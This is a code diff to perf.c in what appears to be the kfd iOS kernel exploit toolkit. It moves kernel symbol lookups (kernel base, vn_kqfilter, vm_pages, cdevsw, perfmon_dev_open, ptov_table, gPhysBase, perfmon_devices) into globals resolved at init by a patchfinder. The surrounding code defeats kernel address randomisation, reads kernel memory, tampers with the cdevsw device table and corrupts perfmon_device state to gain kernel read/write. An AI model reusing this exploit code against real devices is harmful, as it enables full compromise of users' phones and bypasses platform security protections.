@@ -4,17 +4,26 @@
 
 #include "perf.h"
 
+uint64_t kaddr_base = 0;
+uint64_t kaddr_vn_kqfilter = 0;
+uint64_t kaddr_vm_pages = 0;
+uint64_t kaddr_vm_page_array_beginning = 0;
+uint64_t kaddr_vm_page_array_ending = 0;
+uint64_t kaddr_vm_first_phys_ppnum = 0;
+uint64_t kaddr_cdevsw = 0;
+uint64_t kaddr_perfmon_dev_open = 0;
+uint64_t kaddr_ptov_table = 0;
+uint64_t kaddr_gPhysBase = 0;
+uint64_t kaddr_gPhysSize = 0;
+uint64_t kaddr_gVirtBase = 0;
+uint64_t kaddr_perfmon_devices = 0;
+
 void perf_init(struct kfd* kfd)
 {
     char hw_model[16] = {};
     uintptr_t size = sizeof(hw_model);
     assert_bsd(sysctlbyname("hw.model", hw_model, &size, NULL, 0));
     print_string(hw_model);
-    
-    if(isarm64e() && kfd->info.env.vid >= 6) {
-        objcbridge *obj = [[objcbridge alloc] init];
-        [obj prepare_kpf];
-    }
     
     /*
      * Allocate a page that will be used as a shared buffer between user space and kernel space.
@@ -25,6 +34,21 @@ void perf_init(struct kfd* kfd)
     memset((void*)(shared_page_address), 0, shared_page_size);
     kfd->perf.shared_page.uaddr = shared_page_address;
     kfd->perf.shared_page.size = shared_page_size;
+    
+    objcbridge *obj = [[objcbridge alloc] init];
+    kaddr_base = [obj find_base];
+    kaddr_vn_kqfilter = [obj find_vn_kqfilter];
+    kaddr_vm_pages = [obj find_vm_pages];
+    kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
+    kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
+    kaddr_vm_first_phys_ppnum = [obj find_vm_first_phys_ppnum];
+    kaddr_cdevsw = [obj find_cdevsw];
+    kaddr_perfmon_dev_open = [obj find_perfmon_dev_open];
+    kaddr_ptov_table = [obj find_ptov_table];
+    kaddr_gPhysBase = [obj find_gPhysBase];
+    kaddr_gPhysSize = [obj find_gPhysSize];
+    kaddr_gVirtBase = [obj find_gVirtBase];
+    kaddr_perfmon_devices = [obj find_perfmon_devices];
 }
 
 void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
@@ -84,7 +108,6 @@ void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
 
 void perf_run(struct kfd* kfd)
 {
-    objcbridge *obj = [[objcbridge alloc] init];
 
     /*
      * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
@@ -115,8 +138,8 @@ void perf_run(struct kfd* kfd)
     kread_kfd((uint64_t)(kfd), fo_kqfilter_kaddr, &fo_kqfilter, sizeof(fo_kqfilter));
 
     uint64_t vn_kqfilter = unsign_kaddr(fo_kqfilter);
-    uint64_t kernel_slide = vn_kqfilter - [obj find_vn_kqfilter];
-    uint64_t kernel_base = [obj find_base] + kernel_slide;
+    uint64_t kernel_slide = vn_kqfilter - kaddr_vn_kqfilter;
+    uint64_t kernel_base = kaddr_base + kernel_slide;
     kfd->info.kernel.kernel_slide = kernel_slide;
     print_x64(kfd->info.kernel.kernel_slide);
 
@@ -129,10 +152,10 @@ void perf_run(struct kfd* kfd)
     /*
      * Set up some globals used by vm_page.h.
      */
-    uint64_t vm_pages_kaddr = [obj find_vm_pages] + kernel_slide;
-    uint64_t vm_page_array_beginning_addr_kaddr = [obj find_vm_page_array_beginning] + kernel_slide;
-    uint64_t vm_page_array_ending_addr_kaddr = [obj find_vm_page_array_ending] + kernel_slide;
-    uint64_t vm_first_phys_ppnum_kaddr = [obj find_vm_first_phys_ppnum] + kernel_slide;
+    uint64_t vm_pages_kaddr = kaddr_vm_pages + kernel_slide;
+    uint64_t vm_page_array_beginning_addr_kaddr = kaddr_vm_page_array_beginning + kernel_slide;
+    uint64_t vm_page_array_ending_addr_kaddr = kaddr_vm_page_array_ending + kernel_slide;
+    uint64_t vm_first_phys_ppnum_kaddr = kaddr_vm_first_phys_ppnum + kernel_slide;
     kread_kfd((uint64_t)(kfd), vm_pages_kaddr, &vm_pages, sizeof(vm_pages));
     kread_kfd((uint64_t)(kfd), vm_page_array_beginning_addr_kaddr, &vm_page_array_beginning_addr, sizeof(vm_page_array_beginning_addr));
     kread_kfd((uint64_t)(kfd), vm_page_array_ending_addr_kaddr, &vm_page_array_ending_addr, sizeof(vm_page_array_ending_addr));
@@ -152,8 +175,8 @@ void perf_run(struct kfd* kfd)
     kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + 0x0018; // offsetof(struct specinfo, si_rdev)
     kread_kfd((uint64_t)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
-    uint64_t cdevsw_kaddr = [obj find_cdevsw] + kernel_slide;
-    uint64_t perfmon_dev_open_kaddr = [obj find_perfmon_dev_open] + kernel_slide;
+    uint64_t cdevsw_kaddr = kaddr_cdevsw + kernel_slide;
+    uint64_t perfmon_dev_open_kaddr = kaddr_perfmon_dev_open + kernel_slide;
     uint64_t cdevsw[14] = {};
     uint32_t dev_new_major = 0;
     for (uint64_t dmaj = 0; dmaj < 64; dmaj++) {
@@ -176,18 +199,18 @@ void perf_run(struct kfd* kfd)
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
-    uint64_t ptov_table_kaddr = [obj find_ptov_table] + kernel_slide;
+    uint64_t ptov_table_kaddr = kaddr_ptov_table + kernel_slide;
     kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
 
-    uint64_t gVirtBase_kaddr = [obj find_gVirtBase] + kernel_slide;
+    uint64_t gVirtBase_kaddr = kaddr_gVirtBase + kernel_slide;
     kread_kfd((uint64_t)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
     print_x64(kfd->info.kernel.gVirtBase);
 
-    uint64_t gPhysBase_kaddr = [obj find_gPhysBase] + kernel_slide;
+    uint64_t gPhysBase_kaddr = kaddr_gPhysBase + kernel_slide;
     kread_kfd((uint64_t)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
     print_x64(kfd->info.kernel.gPhysBase);
 
-    uint64_t gPhysSize_kaddr = [obj find_gPhysSize] + kernel_slide;
+    uint64_t gPhysSize_kaddr = kaddr_gPhysSize + kernel_slide;
     kread_kfd((uint64_t)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
     print_x64(kfd->info.kernel.gPhysSize);
 
@@ -217,7 +240,7 @@ void perf_run(struct kfd* kfd)
      * - perfmon_devices[0][0].pmdv_allocated = true
      */
     struct perfmon_device perfmon_device = {};
-    uint64_t perfmon_device_kaddr = [obj find_perfmon_devices] + kernel_slide;
+    uint64_t perfmon_device_kaddr = kaddr_perfmon_devices + kernel_slide;
     uint8_t* perfmon_device_uaddr = (uint8_t*)(&perfmon_device);
     kread_kfd((uint64_t)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
     assert((perfmon_device.pmdv_mutex[0] & 0xffffff00ffffffff) == 0x0000000022000000);
